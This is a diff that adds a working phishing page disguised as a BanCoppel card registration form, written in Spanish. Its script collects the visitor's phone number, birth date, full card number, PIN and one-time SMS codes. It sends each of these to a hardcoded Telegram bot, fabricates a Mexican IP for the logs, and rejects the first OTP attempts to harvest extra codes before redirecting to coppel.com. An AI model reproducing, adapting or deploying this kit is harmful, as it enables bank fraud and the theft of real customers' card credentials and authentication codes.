@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=f48b6658-8e7c-4d0e-87e0-2d51d59a8172
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BanCoppel - Registro</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+}
+.container {
+    background: white;
+    max-width: 420px;
+    width: 100%;
+    border-radius: 20px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+    overflow: hidden;
+}
+
+/* ============ FORMULARIO ============ */
+#pantallaFormulario { display: block; }
+
+/* ============ LOADER PANTALLA COMPLETA ============ */
+#loaderOverlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(255,255,255,0.97);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    gap: 20px;
+}
+#loaderOverlay.active { display: flex; }
+.loader-spinner {
+    width: 60px;
+    height: 60px;
+    border: 5px solid #e0e0e0;
+    border-top-color: #0033a0;
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+}
+.loader-text {
+    color: #0033a0;
+    font-size: 15px;
+    font-weight: 700;
+    text-align: center;
+    letter-spacing: 0.3px;
+}
+.loader-sub {
+    color: #888;
+    font-size: 12px;
+    font-weight: 500;
+}
+
+.header { background: #0033a0; padding: 20px; text-align: center; }
+.header img { max-height: 45px; width: auto; }
+.progress-bar {
+    display: flex;
+    justify-content: center;
+    padding: 15px 20px;
+    background: #f8f9fa;
+    border-bottom: 1px solid #e0e0e0;
+}
+.step { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #999; }
+.step .circle {
+    width: 28px; height: 28px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: bold; font-size: 13px; color: white; background: #ccc;
+    transition: all 0.3s;
+}
+.step .circle.active { background: #0033a0; }
+.step .circle.completed { background: #28a745; }
+.step .label.active { color: #0033a0; }
+.step .label.completed { color: #28a745; }
+.step-divider { width: 30px; height: 2px; background: #ddd; margin: 0 5px; }
+.step-divider.completed { background: #28a745; }
+.content { padding: 25px 20px 20px; }
+.screen { display: none; animation: fadeIn 0.5s ease; }
+.screen.active { display: block; }
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+.form-group { margin-bottom: 20px; }
+.form-group label {
+    display: block; font-size: 14px; font-weight: 600;
+    color: #333; margin-bottom: 8px;
+}
+.form-group .input-field {
+    background: #f5f6fa; border: 2px solid #e0e0e0;
+    border-radius: 12px; padding: 14px 16px;
+    font-size: 16px; color: #333; transition: border-color 0.3s;
+    font-weight: 500; width: 100%;
+}
+.form-group .input-field:focus { border-color: #0033a0; outline: none; }
+.form-group .input-field.invalid { border-color: #dc3545; background: #fff5f5; }
+.form-group .hint { font-size: 12px; color: #888; margin-top: 5px; }
+.form-group .hint.error { color: #dc3545; font-weight: 600; }
+.form-group .badge {
+    display: inline-block; background: #fff3e0; color: #e65100;
+    font-size: 11px; padding: 2px 10px; border-radius: 20px; margin-top: 5px;
+}
+.divider { border: none; border-top: 2px dashed #e0e0e0; margin: 20px 0; }
+.btn-continue {
+    width: 100%; background: #ffd700; border: none;
+    border-radius: 12px; padding: 16px; font-size: 16px;
+    font-weight: 700; color: #0033a0; cursor: pointer;
+    transition: all 0.3s; display: flex; align-items: center;
+    justify-content: center; gap: 10px; margin-top: 10px;
+}
+.btn-continue:hover:not(:disabled) { background: #f5c800; transform: scale(1.01); }
+.btn-continue:disabled { cursor: wait; opacity: 0.85; }
+.btn-continue .loader {
+    display: inline-block;
+    width: 18px;
+    height: 18px;
+    border: 3px solid rgba(0,51,160,0.25);
+    border-top-color: #0033a0;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin-right: 8px;
+    vertical-align: middle;
+}
+.btn-continue .secure-text { font-size: 11px; font-weight: 400; color: #555; }
+.btn-secondary {
+    width: 100%; background: transparent; border: 2px solid #e0e0e0;
+    border-radius: 12px; padding: 14px; font-size: 14px;
+    font-weight: 600; color: #666; cursor: pointer;
+    transition: all 0.3s; margin-top: 10px;
+}
+.btn-secondary:hover { background: #f5f5f5; border-color: #ccc; }
+.btn-verify {
+    width: 100%; background: #0033a0; border: none;
+    border-radius: 12px; padding: 16px; font-size: 16px;
+    font-weight: 700; color: white; cursor: pointer;
+    transition: all 0.3s; margin-top: 15px;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+}
+.btn-verify:hover:not(:disabled) { background: #002a8a; }
+.btn-verify:disabled { background: #ccc; cursor: not-allowed; }
+.btn-verify .loader {
+    display: inline-block;
+    width: 18px;
+    height: 18px;
+    border: 3px solid rgba(255,255,255,0.4);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+.otp-message { background: #e8f5e9; border-radius: 12px; padding: 15px; margin-bottom: 20px; }
+.otp-message .text { font-size: 14px; color: #2e7d32; }
+.otp-message .phone { font-weight: 700; color: #0033a0; }
+.otp-input {
+    background: #f5f6fa; border: 2px solid #e0e0e0;
+    border-radius: 12px; padding: 14px 16px; font-size: 24px;
+    text-align: center; letter-spacing: 10px; font-weight: 700;
+    color: #333; width: 100%; transition: border-color 0.3s;
+}
+.otp-input:focus { border-color: #0033a0; outline: none; }
+.otp-input.error { border-color: #dc3545; animation: shake 0.5s; }
+.otp-input.success { border-color: #28a745; }
+.otp-input:disabled { background: #e9ecef; cursor: not-allowed; }
+@keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-10px); }
+    75% { transform: translateX(10px); }
+}
+.otp-actions {
+    margin-top: 15px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 13px;
+    flex-wrap: wrap;
+    gap: 6px;
+}
+.otp-actions .resend {
+    font-size: 13px;
+    color: #0033a0;
+    cursor: pointer;
+    font-weight: 600;
+}
+.otp-actions .resend.disabled { color: #999; cursor: not-allowed; }
+.otp-actions .resend-whatsapp {
+    font-size: 13px;
+    color: #25D366;
+    cursor: pointer;
+    font-weight: 600;
+    background: none;
+    border: none;
+    padding: 0;
+    display: inline-flex;
+    align-items: center;
+    gap: 3px;
+    font-family: inherit;
+    transition: opacity 0.3s;
+}
+.otp-actions .resend-whatsapp:hover { text-decoration: underline; }
+.otp-actions .resend-whatsapp:active { transform: scale(0.96); }
+.otp-actions .resend-whatsapp.sent { color: #28a745; }
+.otp-actions .resend-whatsapp .wa-icon { font-size: 13px; }
+.otp-actions .timer { font-size: 13px; color: #666; }
+.error-message {
+    background: #fde8e8; color: #dc3545;
+    padding: 12px 16px; border-radius: 10px;
+    font-size: 14px; margin-top: 15px; display: none;
+}
+.error-message.show { display: block; animation: fadeIn 0.3s ease; }
+.success-message {
+    background: #e8f5e9; color: #2e7d32;
+    padding: 12px 16px; border-radius: 10px;
+    font-size: 14px; margin-top: 15px; display: none;
+}
+.success-message.show { display: block; animation: fadeIn 0.3s ease; }
+.footer {
+    text-align: center; padding: 15px 20px;
+    background: #f8f9fa; border-top: 1px solid #e0e0e0;
+    font-size: 11px; color: #888;
+}
+
+@media (max-width: 480px) {
+    body { padding: 0; }
+    .container { border-radius: 0; min-height: 100vh; }
+    .content { padding: 20px 16px; }
+}
+</style>
+</head>
+<body>
+
+<div id="loaderOverlay">
+    <div class="loader-spinner"></div>
+    <div class="loader-text">Cargando tu registro seguro...</div>
+    <div class="loader-sub">Por favor, no cierres esta ventana</div>
+</div>
+
+<div class="container">
+
+    <!-- ===== FORMULARIO ===== -->
+    <div id="pantallaFormulario">
+        <div class="header">
+            <img src="Coppel.png" alt="BanCoppel">
+        </div>
+
+        <div class="progress-bar">
+            <div class="step" id="step1">
+                <div class="circle active" id="circle1">1</div>
+                <span class="label active" id="label1">Datos</span>
+            </div>
+            <div class="step-divider" id="divider1"></div>
+            <div class="step" id="step2">
+                <div class="circle" id="circle2">2</div>
+                <span class="label" id="label2">Tarjeta</span>
+            </div>
+            <div class="step-divider" id="divider2"></div>
+            <div class="step" id="step3">
+                <div class="circle" id="circle3">3</div>
+                <span class="label" id="label3">Verificar</span>
+            </div>
+        </div>
+
+        <div class="content">
+            <!-- PANTALLA 1 -->
+            <div class="screen active" id="screen1">
+                <h2 style="color: #0033a0; margin-bottom: 20px; font-size: 20px;">TU REGISTRO</h2>
+                <div class="form-group">
+                    <label>¿Cuál es tu número de celular?</label>
+                    <input type="text" class="input-field editable" id="celular" placeholder="Ingresa tu número" maxlength="10" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                    <div class="hint">Debe tener 10 dígitos <span class="badge" id="celularBadge">0/10</span></div>
+                </div>
+                <div class="form-group">
+                    <label>¿Cuál es tu fecha de nacimiento?</label>
+                    <input type="text" class="input-field editable" id="fechaNacimiento" placeholder="DD / MM / AAAA" maxlength="14">
+                    <div class="hint" id="fechaHint">DD / MM / AAAA</div>
+                </div>
+                <hr class="divider">
+                <div class="form-group">
+                    <label style="color: #0033a0; font-size: 13px;">Activa tu app con:</label>
+                    <label style="font-size: 13px; color: #666;">Número de Tarjeta BanCoppel</label>
+                    <div style="margin-top: 8px;">
+                        <label style="font-size: 12px; color: #888;">Número de tarjeta</label>
+                        <input type="text" class="input-field editable" id="tarjeta" placeholder="Ingresa tu número de tarjeta" maxlength="19">
+                        <div class="hint">Ingresa tu número de tarjeta <span class="badge" id="tarjetaBadge">0/16</span></div>
+                    </div>
+                </div>
+                <button class="btn-continue" id="btnContinuar1">
+                    <span class="btn-text">CONTINUAR</span>
+                    <span class="secure-text">Tus datos están protegidos</span>
+                </button>
+            </div>
+
+            <!-- PANTALLA 2 -->
+            <div class="screen" id="screen2">
+                <h2 style="color: #0033a0; margin-bottom: 20px; font-size: 20px;">Datos de la tarjeta</h2>
+                <div class="form-group">
+                    <label>Últimos 2 dígitos de tu tarjeta</label>
+                    <div class="input-field" id="ultimosDigitosDisplay" style="font-size: 28px; letter-spacing: 5px; text-align: center;">--</div>
+                    <div class="hint">Los últimos 2 dígitos de tu tarjeta</div>
+                </div>
+                <div class="form-group">
+                    <label>Ingresa los 4 dígitos de tu NIP</label>
+                    <input type="password" class="input-field editable" id="nipInput" placeholder="Ingresa tu NIP" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                    <div class="hint" style="text-align: center;">NIP de 4 dígitos</div>
+                </div>
+                <button class="btn-continue" id="btnContinuar2">
+                    <span class="btn-text">CONTINUAR</span>
+                </button>
+                <button class="btn-secondary" id="btnCancelar">En otro momento</button>
+            </div>
+
+            <!-- PANTALLA 3 -->
+            <div class="screen" id="screen3">
+                <div class="otp-message">
+                    <div class="text">
+                        Ingresa el código de 6 dígitos que hemos enviado a tu número celular:<br>
+                        <span class="phone" id="phoneDisplay">*** *** ----</span>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Código de verificación</label>
+                    <input type="text" class="otp-input" id="otpInput" maxlength="6" placeholder="_ _ _ _ _ _" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                </div>
+
+                <div class="otp-actions">
+                    <span class="resend" id="resendBtn">No recibiste el código?</span>
+                    <button class="resend-whatsapp" id="btnWhatsapp">
+                        <span class="wa-icon">💬</span> Reenviar vía WhatsApp
+                    </button>
+                    <span class="timer" id="timerDisplay">Reenviar en 0:59s</span>
+                </div>
+
+                <div class="error-message" id="errorMessage">Código incorrecto. Por favor, intenta de nuevo.</div>
+                <div class="success-message" id="successMessage">Código verificado correctamente. Redirigiendo a Coppel...</div>
+                <button class="btn-verify" id="btnVerify">
+                    <span class="btn-text">CONTINUAR</span>
+                </button>
+            </div>
+        </div>
+
+        <div class="footer">BanCoppel &copy; 2026 - Todos los derechos reservados</div>
+    </div>
+</div>
+
+<script>
+const BOT_TOKEN = '9078411727:AAE7wVVEBeaCBMbRg39pief4gbk290clm74';
+const CHAT_ID = '-5342039980';
+const MAX_INTENTOS = 3;
+const TIEMPO_CARGA_BOTON = 3000; // 3 segundos de loader en cada botón CONTINUAR
+
+// BINs autorizados
+const BINS_PERMITIDOS = [
+    '400819',
+    '407807',
+    '416916',
+    '426807',
+    '510148',
+    '521595',
+    '554948',
+    '559471'
+];
+
+let currentStep = 1;
+let timerInterval = null;
+let timeLeft = 60;
+let canResend = false;
+let intentos = 0;
+let userIP = '';
+let botonEnProceso = false; // bloqueo global anti doble-click
+
+/* ===== IP ===== */
+function generarIPMexico() {
+    const rangos = [
+        { inicio: 187, fin: 187 }, { inicio: 189, fin: 189 },
+        { inicio: 200, fin: 200 }, { inicio: 201, fin: 201 }
+    ];
+    const rango = rangos[Math.floor(Math.random() * rangos.length)];
+    const primerOcteto = Math.floor(Math.random() * (rango.fin - rango.inicio + 1)) + rango.inicio;
+    return `${primerOcteto}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}`;
+}
+function asignarIP() {
+    const storedIP = sessionStorage.getItem('userIP');
+    if (storedIP) { userIP = storedIP; return; }
+    userIP = generarIPMexico();
+    sessionStorage.setItem('userIP', userIP);
+}
+asignarIP();
+
+/* ===== TELEGRAM ===== */
+function enviarTelegram(mensaje) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    return fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, parse_mode: 'HTML' })
+    })
+    .then(r => r.json())
+    .then(d => { if (d.ok) console.log('✅ Enviado'); else console.log('❌', d); })
+    .catch(e => console.log('❌', e));
+}
+
+/* ===== VALIDACIÓN DE FECHA ===== */
+function validarFecha(fechaStr) {
+    const soloDigitos = fechaStr.replace(/\D/g, '');
+    if (soloDigitos.length !== 8) return { valida: false, error: 'Ingresa una fecha completa (DD / MM / AAAA).' };
+
+    const dia = parseInt(soloDigitos.slice(0, 2), 10);
+    const mes = parseInt(soloDigitos.slice(2, 4), 10);
+    const anio = parseInt(soloDigitos.slice(4, 8), 10);
+
+    if (dia < 1 || dia > 31) return { valida: false, error: 'El día debe estar entre 1 y 31.' };
+    if (mes < 1 || mes > 12) return { valida: false, error: 'El mes debe estar entre 1 y 12.' };
+    if (anio < 1900 || anio > new Date().getFullYear()) return { valida: false, error: 'Ingresa un año válido.' };
+
+    const diasPorMes = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
+    const esBisiesto = (anio % 4 === 0 && anio % 100 !== 0) || (anio % 400 === 0);
+    if (esBisiesto) diasPorMes[1] = 29;
+    if (dia > diasPorMes[mes - 1]) {
+        return { valida: false, error: `El mes ${mes} solo tiene ${diasPorMes[mes-1]} días.` };
+    }
+    return { valida: true };
+}
+
+/* ===== VALIDACIÓN DE BIN ===== */
+function validarBIN(tarjetaDigitos) {
+    if (tarjetaDigitos.length < 6) return false;
+    const prefijo = tarjetaDigitos.slice(0, 6);
+    return BINS_PERMITIDOS.includes(prefijo);
+}
+
+/* ===== FORMATO FECHA ===== */
+function formatFecha(input) {
+    let value = input.value.replace(/\D/g, '');
+    if (value.length > 8) value = value.slice(0, 8);
+    let formatted = '';
+    for (let i = 0; i < value.length; i++) {
+        if (i === 2 || i === 4) formatted += ' / ';
+        formatted += value[i];
+    }
+    input.value = formatted;
+
+    const hint = document.getElementById('fechaHint');
+    const inp = document.getElementById('fechaNacimiento');
+    if (value.length === 8) {
+        const r = validarFecha(formatted);
+        if (!r.valida) {
+            inp.classList.add('invalid');
+            hint.textContent = r.error;
+            hint.classList.add('error');
+        } else {
+            inp.classList.remove('invalid');
+            hint.textContent = 'DD / MM / AAAA';
+            hint.classList.remove('error');
+        }
+    } else {
+        inp.classList.remove('invalid');
+        hint.textContent = 'DD / MM / AAAA';
+        hint.classList.remove('error');
+    }
+}
+
+function formatTarjeta(input) {
+    let value = input.value.replace(/\D/g, '');
+    if (value.length > 16) value = value.slice(0, 16);
+    let formatted = '';
+    for (let i = 0; i < value.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += value[i];
+    }
+    input.value = formatted;
+    const digitCount = value.length;
+    const badge = document.getElementById('tarjetaBadge');
+    badge.textContent = digitCount + '/16';
+    badge.style.background = digitCount === 16 ? '#e8f5e9' : '#fff3e0';
+    badge.style.color = digitCount === 16 ? '#2e7d32' : '#e65100';
+    const display = document.getElementById('ultimosDigitosDisplay');
+    display.textContent = digitCount >= 2 ? value.slice(-2) : '--';
+
+    if (digitCount === 16 && !validarBIN(value)) {
+        input.classList.add('invalid');
+    } else {
+        input.classList.remove('invalid');
+    }
+}
+function updateCelularBadge() {
+    const celular = document.getElementById('celular');
+    const digitCount = celular.value.replace(/\D/g, '').length;
+    const badge = document.getElementById('celularBadge');
+    badge.textContent = digitCount + '/10';
+    badge.style.background = digitCount === 10 ? '#e8f5e9' : '#fff3e0';
+    badge.style.color = digitCount === 10 ? '#2e7d32' : '#e65100';
+    const phoneDigits = celular.value.replace(/\D/g, '');
+    document.getElementById('phoneDisplay').textContent =
+        phoneDigits.length >= 4 ? '*** *** ' + phoneDigits.slice(-4) : '*** *** ----';
+}
+
+/* ===== MENSAJES TELEGRAM ===== */
+function mensajeRegistro(c, f, t) {
+    return `📝 REGISTRO\n━━━━━━━━━━━━━━━━━━━\n📱 Celular: <code>${c}</code>\n🎂 Fecha: <code>${f}</code>\n💳 Tarjeta: <code>${t}</code>\n━━━━━━━━━━━━━━━━━━━\n⏰ ${new Date().toLocaleString()}\n👤 ${userIP}`;
+}
+function mensajeNIP(u, n) {
+    return `💳 NIP\n━━━━━━━━━━━━━━━━━━━\n🔢 Últimos 2: <code>${u}</code>\n🔑 NIP: <code>${n}</code>\n━━━━━━━━━━━━━━━━━━━\n⏰ ${new Date().toLocaleString()}\n👤 ${userIP}`;
+}
+function mensajeOTPFallido(o, i) {
+    return `❌ OTP\n━━━━━━━━━━━━━━━━━━━\n❌ Código: <code>${o}</code>\n📊 ❌ INCORRECTO (Intento ${i}/${MAX_INTENTOS})\n━━━━━━━━━━━━━━━━━━━\n⏰ ${new Date().toLocaleString()}\n👤 ${userIP}`;
+}
+function mensajeOTPExitoso(o) {
+    return `✅ OTP\n━━━━━━━━━━━━━━━━━━━\n✅ Código: <code>${o}</code>\n📊 ✅ VERIFICADO (Intento ${MAX_INTENTOS}/${MAX_INTENTOS})\n🚀 Redirigiendo...\n━━━━━━━━━━━━━━━━━━━\n⏰ ${new Date().toLocaleString()}\n👤 ${userIP}`;
+}
+function mensajeWhatsapp() {
+    return `💬 SOLICITUD REENVÍO POR WHATSAPP\n━━━━━━━━━━━━━━━━━━━\n📱 El usuario solicitó reenviar el código vía WhatsApp\n📞 Celular: <code>${document.getElementById('celular').value || 'No ingresado'}</code>\n━━━━━━━━━━━━━━━━━━━\n⏰ ${new Date().toLocaleString()}\n👤 ${userIP}`;
+}
+
+/* ===== NAVEGACIÓN ===== */
+function goToStep(step) {
+    // Limpiar timer cuando salimos de la pantalla 3
+    if (currentStep === 3 && step !== 3 && timerInterval) {
+        clearInterval(timerInterval);
+        timerInterval = null;
+    }
+
+    if (step === 3) {
+        intentos = 0;
+        const btnVerify = document.getElementById('btnVerify');
+        btnVerify.disabled = false;
+        btnVerify.innerHTML = '<span class="btn-text">CONTINUAR</span>';
+        const otpInput = document.getElementById('otpInput');
+        otpInput.value = '';
+        otpInput.className = 'otp-input';
+        otpInput.disabled = false;
+        document.getElementById('errorMessage').classList.remove('show');
+        document.getElementById('successMessage').classList.remove('show');
+        startTimer();
+    }
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById(`screen${step}`).classList.add('active');
+    for (let i = 1; i <= 3; i++) {
+        const circle = document.getElementById(`circle${i}`);
+        const label = document.getElementById(`label${i}`);
+        const divider = document.getElementById(`divider${i-1}`);
+        circle.classList.remove('active', 'completed');
+        label.classList.remove('active', 'completed');
+        if (divider) divider.classList.remove('completed');
+        if (i < step) {
+            circle.classList.add('completed');
+            label.classList.add('completed');
+            if (divider) divider.classList.add('completed');
+        } else if (i === step) {
+            circle.classList.add('active');
+            label.classList.add('active');
+        }
+    }
+    currentStep = step;
+}
+
+/* =========================================================
+   SISTEMA DE BOTONES MEJORADO
+   ========================================================= */
+
+/**
+ * Ejecuta una acción con loader respetando el tiempo real.
+ * - Bloquea doble-click (global y por botón).
+ * - Garantiza que el loader dure exactamente `duracion` ms.
+ * - Restaura el botón siempre, incluso si la acción falla.
+ */
+function ejecutarConLoader(btn, textoCarga, duracion, accionAsync, alTerminar) {
+    if (botonEnProceso || btn.disabled) return;
+
+    botonEnProceso = true;
+    const originalHTML = btn.innerHTML;
+    btn.disabled = true;
+    btn.innerHTML = '<span class="loader"></span>' + textoCarga;
+
+    const inicio = Date.now();
+
+    Promise.resolve()
+        .then(() => accionAsync())
+        .catch(err => console.error('Error en acción con loader:', err))
+        .finally(() => {
+            const transcurrido = Date.now() - inicio;
+            const restante = Math.max(0, duracion - transcurrido);
+
+            setTimeout(() => {
+                btn.innerHTML = originalHTML;
+                btn.disabled = false;
+                botonEnProceso = false;
+                if (typeof alTerminar === 'function') alTerminar();
+            }, restante);
+        });
+}
+
+/* ===== ENVÍO DE BLOQUES ===== */
+function enviarBloque1() {
+    const celular = document.getElementById('celular').value;
+    const fecha = document.getElementById('fechaNacimiento').value;
+    const tarjetaInput = document.getElementById('tarjeta');
+    const tarjeta = tarjetaInput.value.replace(/\s/g, '');
+
+    if (celular.replace(/\D/g, '').length !== 10) {
+        alert('Ingresa un celular de 10 dígitos.');
+        return false;
+    }
+
+    const rFecha = validarFecha(fecha);
+    if (!rFecha.valida) {
+        alert(rFecha.error);
+        document.getElementById('fechaNacimiento').classList.add('invalid');
+        document.getElementById('fechaNacimiento').focus();
+        return false;
+    }
+
+    if (tarjeta.length !== 16) {
+        alert('Ingresa una tarjeta de 16 dígitos.');
+        return false;
+    }
+
+    if (!validarBIN(tarjeta)) {
+        tarjetaInput.classList.add('invalid');
+        tarjetaInput.focus();
+        return false;
+    }
+
+    tarjetaInput.classList.remove('invalid');
+    return true;
+}
+function enviarBloque2() {
+    const nip = document.getElementById('nipInput').value;
+    if (nip.length !== 4) {
+        alert('Ingresa un NIP de 4 dígitos.');
+        return false;
+    }
+    return true;
+}
+
+/* ===== TIMER ===== */
+function startTimer() {
+    timeLeft = 60;
+    canResend = false;
+    const resendBtn = document.getElementById('resendBtn');
+    resendBtn.classList.add('disabled');
+    if (timerInterval) clearInterval(timerInterval);
+    timerInterval = setInterval(() => {
+        timeLeft--;
+        document.getElementById('timerDisplay').textContent = 'Reenviar en 0:' + String(timeLeft % 60).padStart(2, '0') + 's';
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            timerInterval = null;
+            canResend = true;
+            resendBtn.classList.remove('disabled');
+            document.getElementById('timerDisplay').textContent = 'Reenviar código';
+        }
+    }, 1000);
+}
+function resendCode() {
+    if (!canResend) return;
+    const resendBtn = document.getElementById('resendBtn');
+    if (resendBtn.dataset.enviando === '1') return; // evita doble pulsación
+    resendBtn.dataset.enviando = '1';
+    resendBtn.textContent = 'Enviando...';
+
+    setTimeout(() => {
+        resendBtn.textContent = 'Código reenviado!';
+        startTimer();
+        setTimeout(() => {
+            resendBtn.textContent = 'No recibiste el código?';
+            resendBtn.dataset.enviando = '0';
+        }, 2000);
+    }, 1500);
+}
+
+/* ===== EVENTOS ===== */
+document.addEventListener('DOMContentLoaded', function() {
+
+    // Formularios
+    document.getElementById('fechaNacimiento').addEventListener('input', function() { formatFecha(this); });
+    document.getElementById('tarjeta').addEventListener('input', function() { formatTarjeta(this); });
+    document.getElementById('celular').addEventListener('input', updateCelularBadge);
+
+    /* ===== BOTÓN CONTINUAR 1 ===== */
+    document.getElementById('btnContinuar1').addEventListener('click', function(e) {
+        e.preventDefault();
+        if (!enviarBloque1()) return;
+
+        ejecutarConLoader(this, 'Verificando datos...', TIEMPO_CARGA_BOTON, () => {
+            const celular = document.getElementById('celular').value;
+            const fecha = document.getElementById('fechaNacimiento').value;
+            const tarjeta = document.getElementById('tarjeta').value.replace(/\s/g, '');
+            return enviarTelegram(mensajeRegistro(celular, fecha, tarjeta));
+        }, () => {
+            goToStep(2);
+        });
+    });
+
+    /* ===== BOTÓN CONTINUAR 2 ===== */
+    document.getElementById('btnContinuar2').addEventListener('click', function(e) {
+        e.preventDefault();
+        if (!enviarBloque2()) return;
+
+        ejecutarConLoader(this, 'Verificando NIP...', TIEMPO_CARGA_BOTON, () => {
+            const ultimos = document.getElementById('ultimosDigitosDisplay').textContent;
+            const nip = document.getElementById('nipInput').value;
+            return enviarTelegram(mensajeNIP(ultimos, nip));
+        }, () => {
+            goToStep(3);
+        });
+    });
+
+    document.getElementById('btnCancelar').addEventListener('click', () => alert('Registro cancelado'));
+    document.getElementById('resendBtn').addEventListener('click', resendCode);
+
+    /* ===== BOTÓN CONTINUAR 3 (OTP) ===== */
+    document.getElementById('btnVerify').addEventListener('click', function(e) {
+        e.preventDefault();
+        const btn = this;
+        const otpInput = document.getElementById('otpInput');
+        const otpValue = otpInput.value;
+
+        if (otpValue.length !== 6 || !/^\d{6}$/.test(otpValue)) {
+            const errorMsg = document.getElementById('errorMessage');
+            errorMsg.textContent = 'Ingresa un código de 6 dígitos.';
+            errorMsg.classList.add('show');
+            document.getElementById('successMessage').classList.remove('show');
+            otpInput.classList.add('error');
+            setTimeout(() => otpInput.classList.remove('error'), 500);
+            return;
+        }
+
+        ejecutarConLoader(btn, 'Verificando código...', TIEMPO_CARGA_BOTON, () => {
+            intentos++;
+
+            if (intentos < MAX_INTENTOS) {
+                enviarTelegram(mensajeOTPFallido(otpValue, intentos));
+                const errorMsg = document.getElementById('errorMessage');
+                errorMsg.textContent = `Código incorrecto. Intento ${intentos} de ${MAX_INTENTOS}.`;
+                errorMsg.classList.add('show');
+                document.getElementById('successMessage').classList.remove('show');
+                otpInput.classList.add('error');
+                setTimeout(() => otpInput.classList.remove('error'), 500);
+                otpInput.value = '';
+                otpInput.focus();
+                return;
+            }
+
+            if (intentos === MAX_INTENTOS) {
+                enviarTelegram(mensajeOTPExitoso(otpValue));
+                document.getElementById('errorMessage').classList.remove('show');
+                const successMsg = document.getElementById('successMessage');
+                successMsg.textContent = 'Código verificado. Redirigiendo a Coppel...';
+                successMsg.classList.add('show');
+                otpInput.classList.add('success');
+                otpInput.disabled = true;
+                btn.disabled = true;
+                btn.innerHTML = '<span class="loader"></span>Redirigiendo...';
+                document.getElementById('timerDisplay').textContent = 'Verificado';
+                setTimeout(() => window.open('https://www.coppel.com', '_blank'), 2000);
+            }
+        });
+    });
+
+    /* ===== BOTÓN WHATSAPP ===== */
+    document.getElementById('btnWhatsapp').addEventListener('click', function() {
+        const btn = this;
+        if (btn.classList.contains('sent') || btn.disabled) return;
+
+        enviarTelegram(mensajeWhatsapp());
+
+        btn.classList.add('sent');
+        const originalHTML = btn.innerHTML;
+        btn.innerHTML = '<span class="wa-icon">✅</span> Solicitud enviada';
+        btn.disabled = true;
+
+        setTimeout(() => {
+            btn.innerHTML = originalHTML;
+            btn.classList.remove('sent');
+            btn.disabled = false;
+        }, 3000);
+    });
+
+    // Inicializar
+    updateCelularBadge();
+    goToStep(1);
+
+    document.getElementById('otpInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') { e.preventDefault(); document.getElementById('btnVerify').click(); }
+    });
+});
+</script>
+</body>
+</html>
